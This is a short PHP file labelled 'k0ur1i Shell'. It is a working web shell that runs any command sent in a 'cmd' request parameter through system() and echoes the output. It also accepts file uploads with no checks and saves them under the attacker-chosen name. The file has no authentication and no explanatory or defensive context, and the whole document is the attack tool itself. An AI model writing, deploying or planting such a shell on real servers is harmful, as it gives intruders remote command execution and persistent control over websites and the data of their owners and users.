<?php
// Simple PHP Web Shell

if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}

if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
    die;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>k0ur1i Shell</title>
</head>
<body>
    <h1>Welcome to k0ur1i Shell</h1>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command">
        <button type="submit">Execute</button>
    </form>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>
</body>
</html>
